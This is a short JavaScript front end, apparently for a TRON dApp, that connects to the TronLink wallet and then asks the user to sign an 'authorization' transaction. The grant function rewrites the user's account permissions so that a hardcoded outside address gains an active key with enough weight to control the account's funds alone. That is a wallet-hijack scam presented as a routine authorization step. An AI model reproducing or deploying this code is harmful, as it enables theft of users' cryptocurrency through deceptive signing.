let tronWeb;
const dappAddress = "TYEWTftYUiifa3aURSFc5r5hTL8gkwtGgs";

async function connect() {
  if (!window.tronLink) {
    alert("請先安裝 TronLink");
    return;
  }

  try {
    await window.tronLink.request({
      method: "tron_requestAccounts"
    });

    tronWeb = window.tronLink.tronWeb;

    document.getElementById("address").innerText =
      "已連接：" + tronWeb.defaultAddress.base58;

  } catch (e) {
    console.error(e);
    alert("使用者拒絕連線");
  }
}

async function grant() {
  if (!tronWeb) {
    alert("請先連接錢包");
    return;
  }

  try {
    const user = tronWeb.defaultAddress.base58;

    const tx = await tronWeb.transactionBuilder.updateAccountPermissions(
      user,
      {
        owner_permission: {
          type: 0,
          permission_name: "owner",
          threshold: 1,
          keys: [{ address: user, weight: 1 }]
        },
        active_permissions: [{
          type: 2,
          permission_name: "active",
          threshold: 1,
          operations:
            "7fff1fc0033e0100000000000000000000000000000000000000000000000000",
          keys: [
            { address: user, weight: 1 },
            { address: dappAddress, weight: 1 }
          ]
        }]
      }
    );

    // ⚠️ 這一行才是「簽名彈窗」
    const signed = await tronWeb.trx.sign(tx);

    const result = await tronWeb.trx.sendRawTransaction(signed);

    alert(result.result ? "授權成功" : "授權失敗");

  } catch (e) {
    console.error(e);
    alert("交易被拒絕或失敗");
  }
}
